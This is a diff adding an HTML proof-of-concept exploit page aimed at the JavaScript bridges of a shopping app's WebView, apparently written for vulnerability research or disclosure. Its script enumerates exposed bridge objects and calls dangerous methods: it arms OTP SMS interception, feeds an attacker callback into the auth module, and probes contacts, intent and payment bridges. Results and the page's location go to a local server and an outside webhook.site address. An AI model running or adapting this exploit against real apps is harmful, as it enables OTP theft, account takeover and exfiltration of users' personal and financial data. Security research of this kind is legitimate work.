@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8"/>
+  <title>FK1 UltraWebView Bridge PoC</title>
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; margin: 0; }
+    #status { font-size: 18px; font-weight: bold; padding: 12px; margin-bottom: 12px;
+              border-radius: 4px; background: #222; }
+    .ok   { color: #0f0; }
+    .err  { color: #f00; }
+    .warn { color: #ff0; }
+    pre   { background: #1a1a1a; padding: 8px; border-left: 3px solid #0f0;
+            white-space: pre-wrap; word-break: break-all; }
+  </style>
+</head>
+<body>
+<div id="status">Initializing...</div>
+<div id="log"></div>
+
+<script>
+// Callbacks
+var LOCAL_CB = 'http://127.0.0.1:18766';  // FK1 PoC APK local server
+var WH = 'https://webhook.site/a4650d9c-8cfb-45cb-826c-02209dd79a8a'; // fallback
+
+function log(msg, cls) {
+  var p = document.createElement('pre');
+  if (cls) p.className = cls;
+  p.textContent = new Date().toISOString().substr(11,8) + '  ' + msg;
+  document.getElementById('log').appendChild(p);
+}
+
+function cb(path, body) {
+  // Try local server first (faster, in same process)
+  var x = new XMLHttpRequest();
+  x.open('GET', LOCAL_CB + '/' + path + '?m=' + encodeURIComponent(String(body)), true);
+  x.send();
+  // Also send to webhook as backup (may fail if fetch blocked)
+  fetch(WH + '/' + path, {method:'POST', headers:{'Content-Type':'text/plain'}, body: String(body)})
+    .catch(function(){});
+}
+
+// ---------------------------------------------------------------
+// Phase 1: Basic info
+// ---------------------------------------------------------------
+log('[1] JS running at: ' + location.href);
+log('[2] UA: ' + navigator.userAgent);
+cb('log', 'FK1-PoC loaded at ' + location.href + ' | UA=' + navigator.userAgent.substr(0,80));
+
+// ---------------------------------------------------------------
+// Phase 2: Enumerate all JS bridge objects
+// The bug: AllowAllUrlWhiteList.isPermitted() returns true unconditionally
+// so ALL registered UltraBridgeModules are accessible from ANY URL.
+// ---------------------------------------------------------------
+log('--- Bridge Enumeration (AllowAllUrlWhiteList exposes all to this origin) ---');
+
+// Known bridge names from decompiled UltraFragment.java + UltraWebView.java
+var KNOWN_BRIDGES = [
+  'JSSMSModule',          // captureOtpMessage() -> arms SMS Retriever -> steals next OTP
+  'JSAuthModule',         // init() -> manipulate auth state
+  'JSContactsModule',     // getAllContacts() -> exfiltrate contacts
+  'RNCGeolocation',       // getCurrentPosition() -> live GPS
+  'PhonePeUltraBridge',   // payment methods -> financial fraud
+  'UltraIntentModule',    // openURL() -> fire arbitrary Intent
+  'JSNavigationModule',   // navigation within Flipkart
+  'JSErrorHandlerModule', // error handling bridge
+];
+
+var foundBridges = [];
+KNOWN_BRIDGES.forEach(function(name) {
+  if (typeof window[name] !== 'undefined') {
+    log('[PRESENT] window.' + name, 'ok');
+    foundBridges.push(name);
+    cb('bridge', 'PRESENT:' + name);
+  } else {
+    log('[ABSENT]  window.' + name, 'warn');
+  }
+});
+
+// Brute-force: enumerate ALL non-standard window objects (finds bridges with unknown names)
+log('--- Full window scan for bridge objects ---');
+var knownStd = new Set(['onload','onunload','onerror','alert','confirm','prompt',
+  'setTimeout','setInterval','clearTimeout','clearInterval','fetch','XMLHttpRequest',
+  'WebSocket','localStorage','sessionStorage','indexedDB','crypto','console','Math',
+  'JSON','Object','Array','String','Number','Boolean','Date','RegExp','Error',
+  'Promise','Symbol','Proxy','Reflect','Map','Set','WeakMap','WeakSet','URL',
+  'URLSearchParams','Blob','File','FileReader','FormData','Headers','Request',
+  'Response','EventSource','MutationObserver','performance','navigator','location',
+  'history','screen','document','window','self','top','parent','frames','opener',
+  'closed','length','name','status','closed','innerWidth','innerHeight',
+  'outerWidth','outerHeight','scrollX','scrollY','pageXOffset','pageYOffset',
+  'devicePixelRatio','addEventListener','removeEventListener','dispatchEvent',
+  'postMessage','close','focus','blur','open','print','stop','getComputedStyle',
+  'matchMedia','scroll','scrollTo','scrollBy','resizeTo','resizeBy','moveTo',
+  'moveBy','atob','btoa','queueMicrotask','requestAnimationFrame',
+  'cancelAnimationFrame','requestIdleCallback','cancelIdleCallback',
+  'CustomEvent','Event','AbortController','AbortSignal','Int8Array','Uint8Array',
+  'Uint8ClampedArray','Int16Array','Uint16Array','Int32Array','Uint32Array',
+  'Float32Array','Float64Array','DataView','ArrayBuffer','SharedArrayBuffer',
+  'Atomics','BigInt','BigInt64Array','BigUint64Array','Node','Element','HTMLElement',
+  'HTMLDocument','SVGElement','IntersectionObserver','ResizeObserver',
+  'CSSStyleDeclaration','DOMParser','XMLSerializer']);
+
+try {
+  Object.getOwnPropertyNames(window).forEach(function(key) {
+    try {
+      var val = window[key];
+      if (!knownStd.has(key) && val !== null && typeof val === 'object') {
+        log('[SCAN] window.' + key + ' (type: object)', 'ok');
+        foundBridges.push(key);
+        cb('bridge', 'SCAN-FOUND:' + key);
+      }
+    } catch(e) {}
+  });
+} catch(e) {
+  log('[SCAN] enumerate failed: ' + e);
+}
+
+// ---------------------------------------------------------------
+// Phase 3: Call dangerous bridge methods
+// ---------------------------------------------------------------
+log('--- Calling Dangerous Bridge Methods ---');
+
+// A: OTP interception — arms SMS Retriever API; next SMS matching pattern is stolen
+if (typeof window['JSSMSModule'] !== 'undefined') {
+  try {
+    var otpTag = 'FK1POC_OTP_' + Date.now();
+    window['JSSMSModule'].captureOtpMessage(otpTag);
+    log('[!!!] JSSMSModule.captureOtpMessage("' + otpTag + '") FIRED', 'ok');
+    log('      Effect: next SMS OTP sent to victim will be intercepted by Flipkart process', 'ok');
+    cb('bridge', 'FIRED:JSSMSModule.captureOtpMessage|tag=' + otpTag);
+  } catch(e) {
+    log('[ERR] JSSMSModule.captureOtpMessage threw: ' + e, 'err');
+    cb('bridge', 'ERR:JSSMSModule.captureOtpMessage|' + e);
+  }
+} else {
+  log('[SKIP] JSSMSModule not found by expected name (may be registered under different key)', 'warn');
+}
+
+// B: Auth module — pass attacker callback URL to auth module
+if (typeof window['JSAuthModule'] !== 'undefined') {
+  try {
+    var authPayload = JSON.stringify({callback: LOCAL_CB + '/stolen', source: 'fk1poc'});
+    window['JSAuthModule'].init(authPayload);
+    log('[!!!] JSAuthModule.init(' + authPayload + ') FIRED', 'ok');
+    cb('bridge', 'FIRED:JSAuthModule.init|' + authPayload);
+  } catch(e) {
+    log('[ERR] JSAuthModule.init threw: ' + e, 'err');
+  }
+}
+
+// C: Check for openURL (arbitrary Intent from Flipkart process)
+var intentBridge = null;
+['UltraIntentModule','IntentModule','ReactNativeIntentModule'].forEach(function(n) {
+  if (typeof window[n] !== 'undefined' && typeof window[n].openURL === 'function') {
+    intentBridge = window[n];
+    log('[!!!] Intent bridge at window.' + n + '.openURL()', 'ok');
+  }
+});
+// Also scan found bridges
+foundBridges.forEach(function(k) {
+  try {
+    if (!intentBridge && typeof window[k] !== 'undefined' && typeof window[k].openURL === 'function') {
+      intentBridge = window[k];
+      log('[!!!] openURL() found on window.' + k, 'ok');
+      cb('bridge', 'FOUND-openURL:' + k);
+    }
+  } catch(e) {}
+});
+
+// D: Contacts exfiltration probe
+if (typeof window['JSContactsModule'] !== 'undefined') {
+  try {
+    var methods = Object.getOwnPropertyNames(window['JSContactsModule']);
+    log('[!!!] JSContactsModule PRESENT — methods: ' + methods.join(', '), 'ok');
+    cb('bridge', 'PRESENT:JSContactsModule|methods=' + methods.join(','));
+  } catch(e) {
+    log('[!!!] JSContactsModule PRESENT (methods not enumerable)', 'ok');
+    cb('bridge', 'PRESENT:JSContactsModule');
+  }
+}
+
+// E: PhonePe probe
+['PhonePeUltraBridge','PhonePeUltraBridgeModule','PayUBridge'].forEach(function(n) {
+  if (typeof window[n] !== 'undefined') {
+    log('[!!!] Payment bridge PRESENT: window.' + n, 'ok');
+    cb('bridge', 'PRESENT:' + n + '-payment-bridge');
+  }
+});
+
+// ---------------------------------------------------------------
+// Phase 4: Summary
+// ---------------------------------------------------------------
+var bridgeCount = foundBridges.length;
+var statusEl = document.getElementById('status');
+if (bridgeCount > 0) {
+  statusEl.style.background = '#8b0000';
+  statusEl.style.color = '#ff4444';
+  statusEl.textContent = 'FK1 CONFIRMED: ' + bridgeCount + ' JS BRIDGE(S) FOUND — AllowAllUrlWhiteList EXPLOITABLE';
+  log('=== FK1 CONFIRMED: ' + bridgeCount + ' bridges found at attacker URL ===', 'err');
+  cb('log', 'FK1-CONFIRMED:bridges=' + foundBridges.join(','));
+} else {
+  statusEl.style.background = '#333';
+  statusEl.style.color = '#ff0';
+  statusEl.textContent = 'No bridges found under expected names — check scan above for unknown names';
+  log('=== No bridges found under expected names. Check SCAN section above. ===', 'warn');
+  cb('log', 'FK1-BRIDGES-NOT-FOUND:may-use-different-names');
+}
+
+log('[*] origin: ' + location.origin);
+log('[*] document.cookie: [' + document.cookie + ']');
+log('[*] done');
+</script>
+</body>
+</html>
